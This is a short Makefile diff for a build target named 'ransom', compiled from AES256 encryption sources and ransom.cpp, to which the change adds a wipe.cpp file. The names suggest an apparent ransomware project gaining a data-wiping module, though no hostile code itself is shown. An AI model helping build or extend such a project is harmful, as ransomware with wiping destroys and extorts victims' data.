@@ -4,7 +4,7 @@ AES_SRC=AES256/AES256.cpp AES256/AES256_Base.cpp AES256/AES256_PRNG.cpp AES256/S
 
 all: ransom
 
-ransom: $(AES_SRC) ransom.cpp
+ransom: $(AES_SRC) ransom.cpp wipe.cpp
 	$(CXX) $(CFLAGS) $^ -o $@
 
 clean:
